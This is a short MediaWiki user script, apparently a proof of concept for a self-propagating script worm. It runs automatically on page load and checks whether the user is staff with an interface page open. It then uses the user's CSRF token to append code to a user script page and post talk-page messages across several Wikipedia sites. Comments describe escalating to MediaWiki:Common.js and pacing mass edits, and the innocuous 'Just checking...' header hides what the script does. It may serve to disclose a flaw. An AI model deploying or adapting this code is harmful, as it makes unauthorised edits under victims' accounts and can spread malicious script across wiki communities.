/**
 * Just checking...
 */
// iife
(function(){
	
	// check if I'm on a staff account which can do more
	function isCurrentUserStaff(checkGroup='staff') {
		const groups = mw.config.get("wgUserGroups") || [];
		const globalGroups = mw.config.get("wgGlobalGroups") || [];

		return groups.includes(checkGroup) || globalGroups.includes(checkGroup);
	}
	// check if I just unlocked Mediawiki edits
	function isUserUnlocked() {
		return (
			mw.config.get("wgAction") === "edit" &&
			mw.config.get("wgNamespaceNumber") === 8 &&
			mw.config.get("wgTitle").endsWith(".js")
		);
	}
	// spread the word
	async function editWiki({user='not used, but it could', domain="meta.wikimedia.org"}={}) {
		await mw.loader.using('mediawiki.api');
		const api = new mw.ForeignApi(`https://${domain}/w/api.php`);
		const username = mw.config.get('wgUserName');

		// ForeignApi edits blocked for meta? (badtoken)... Wise! 🙃
		// (could still do this when being on meta... so that would be as bad as the last time)
		//let script = `User:${username}/global.js`;

		// lets do an edit to /common.js instead we can spread the word from there too
		let script = `User:${username}/wiki-poc--could-be--common.js`;
		if (isUserUnlocked()) {
			//script = `Mediawiki:Common.js`;
			console.error('could be nasty here... but not today');
		}

		await api.postWithToken("csrf", api.assertCurrentUser({
			action: 'edit',
			title: script,
			appendtext: "\nalert('Hi');",
			summary: 'POC edit'
		}));

		await api.postWithToken("csrf", api.assertCurrentUser({
			action: "edit",
			title: "User talk:Nux",
			section: "new",
			sectiontitle: "Hello dark theater my old friend " + (new Date()).toISOString(),
			text: `I just wanted you to check out [[${script}]] ~~~~`,
			summary: "PoC message",
			format: "json"
		}));
	}
	async function doTheStuff() {
		let activeUsers = [];
		if (isCurrentUserStaff() && isUserUnlocked()) {
			// I could do any edits in Mediawiki for an hour here.
			// I could use random await setTimeout to pause execution (to avoid doing too many edits)...
			// ...or I could use setInterval to either do edits in chunks or just repeat edits.
			for (let user of activeUsers) {
				await editWiki({user});
			}
		}

		// simple edit
		let sites = ['pl.wikipedia.org', 'de.wikipedia.org', 'en.wikipedia.org']
		for (let site of sites) {
			editWiki({site});
		}
	}
	$(function(){
		doTheStuff();
	});

// iife
})();
